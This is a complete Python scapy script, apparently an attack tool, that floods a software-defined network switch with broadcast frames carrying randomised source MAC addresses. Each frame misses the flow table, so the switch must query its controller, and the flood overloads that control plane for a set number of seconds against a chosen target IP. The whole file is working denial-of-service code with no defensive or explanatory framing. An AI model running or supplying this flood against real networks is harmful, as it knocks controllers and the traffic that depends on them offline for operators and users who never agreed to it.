#!/usr/bin/env python3
"""Control-plane DoS: every frame has a brand-new source MAC and a broadcast
destination, so the switch cannot match it and must ask the controller.
usage: pktin_flood.py <iface> <dst_ip> <seconds>"""
import random
import sys
import time
from scapy.all import Ether, IP, UDP, conf

iface, dst_ip, dur = sys.argv[1], sys.argv[2], float(sys.argv[3])
sock = conf.L2socket(iface=iface)
end = time.time() + dur
while time.time() < end:
    mac = "02:%02x:%02x:%02x:%02x:%02x" % tuple(random.randrange(256)
                                                for _ in range(5))
    sock.send(Ether(src=mac, dst="ff:ff:ff:ff:ff:ff") / IP(dst=dst_ip) / UDP(dport=9))
